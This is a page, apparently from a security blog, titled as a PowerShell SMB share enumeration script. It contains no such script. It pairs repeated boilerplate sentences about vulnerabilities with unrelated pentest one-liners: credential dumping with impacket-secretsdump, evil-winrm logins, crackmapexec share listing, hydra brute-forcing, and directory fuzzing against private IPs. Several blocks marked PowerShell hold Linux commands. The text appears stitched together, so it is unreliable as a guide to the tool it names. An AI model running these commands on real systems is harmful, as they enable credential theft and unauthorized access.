---
TitleSEO: "SMB Share Enumeration Script in PowerShell | ZureFX"
TitlePost: "SMB Share Enumeration Script — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for smb share enumeration script. Built for security research and automation."
Keywords: "script, parser, fuzzer, powershell"
URL: "https://zurefx.github.io/scripting/script-smb-share-enumeration-script-136.html"
URL_IMAGES: ""
Date: "2024-02-03"
Tags: "Script, Parser, Fuzzer, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-smb-share-enumeration-script-136"
Permalink: "/scripting/script-smb-share-enumeration-script-136.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The service was running without proper input validation, leading to injection vulnerabilities. Privilege escalation was possible due to misconfigured sudo permissions. Authentication bypass was achieved through careful manipulation of the login mechanism.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `rubeus`
- `chisel`
- `feroxbuster`

## Implementation

### Core Logic

The scheduled task ran with elevated privileges and could be abused for escalation. The service account had excessive permissions assigned in Active Directory.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.47.145.142
nmap -sCV -p464,636,23 10.118.18.38 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Command injection was possible through unsanitized user input in the search functionality. The service account had excessive permissions assigned in Active Directory.

### Helper Functions

The target system was identified as running a vulnerable version of the service. Lateral movement was facilitated by reusing discovered credentials across services.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.33.111.217/FUZZ
evil-winrm -i 10.34.204.142 -u administrator -p 'P@ssw0rd!'
```

## Usage

### Basic Usage

The service was running without proper input validation, leading to injection vulnerabilities. The backup files contained sensitive information that should not have been accessible.

```bash
evil-winrm -i 10.119.59.182 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.118.205.10/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.73.111.211 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

The service account had excessive permissions assigned in Active Directory. The service account had excessive permissions assigned in Active Directory. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
gobuster dir -u http://10.82.147.130/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.29.114.234 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.37.86.3 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Output

### Example Output

The kernel version was outdated and vulnerable to a publicly known exploit. The service was running without proper input validation, leading to injection vulnerabilities.

```
[+] Scanning target...
[+] Found 6 results
[+] Done in 10.67s
```
